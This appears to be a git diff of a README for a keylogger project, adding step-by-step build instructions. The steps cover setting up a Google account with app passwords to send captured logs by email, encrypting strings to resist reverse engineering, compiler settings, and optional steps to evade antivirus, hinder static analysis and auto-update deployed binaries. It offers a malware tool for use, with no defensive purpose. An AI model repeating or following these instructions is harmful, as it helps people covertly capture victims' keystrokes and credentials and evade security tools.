@@ -40,7 +40,50 @@ HybridAnalysis:
 
 -----------------------------------------------------------------------
 
-<b> <h3> Screenshots </h3> </b>
+<b> <h3> How to use: </h3> </b> (had to add this since people keep downlading the precompiled binaries)
+
+<b> Step 1:</b></br>
+Download the source code from this Git repository.
+
+</br><b> Step 2:</b></br>
+Setup 2FA and App Passwords on your "email sender" google account.
+
+</br><b> Step 3:</b></br>
+Create your HardEncode and HardDecode functions to crypt the authentication string. (you will have to also re-encrypt several pre-encrypted strings)</br>
+OR reverse the one i already wrote.</br>
+Another possibility is to ditch Auth string encryption, be aware that this exposes strings to reverse engineering.
+
+</br><b> Step 4:</b></br>
+Edit the "common.h" header, customizing the behaviour of the keylogger and adding the encrypted authentication strings.
+
+</br><b> Step 5:</b></br>
+Add "masm" to the project build dependencies.</br>
+Make sure that "random.asm" is <b>not</b> excluded from the build.</br>
+Set Project->Linker->System->Subsystem to "WINDOWS".</br>
+Set Project->C/C++->Optimization->Whole Program Optimization to "No", Optimization to /Ox and Favor Size Or Speed to "Neither".</br>
+Set Project->C/C++->Code Generation->Runtime Library to "/MT Multi-Threaded".</br>
+Ensure that the project is set to Release x64.
+
+</br><b> Step 5.5:(OPTIONAL)</b></br>
+Research how to lower detection rates and mislead reverse engineers using project settings, there are loads of articles/forum posts on the subject.</br>
+This helps a lot in evading AVs.
+
+</br><b> Step 6:</b></br>
+Ctrl+shift+b to compile.
+
+</br><b> Step 6.5(OPTIONAL):</b></br>
+Manipulate the executable to strip sensitive data / make static analysis harder.</br>
+It's up to you to find out how.
+
+
+</br></br><b><h3>And here is your compiled, working, binary.</h3></b></br>
+
+</br><b> Step 7(OPTIONAL):</b></br>
+Set up a Github repo with your compiled binary to auto-update.
+
+-----------------------------------------------------------------------
+
+<b> <h3> Demos </h3> </b>
 
 <b>Unfortunately a single log now takes up more than 4-5 screenshots, so i'll replace them with a link to two demo logs: a crypted and an unencrypted one.</b>
 
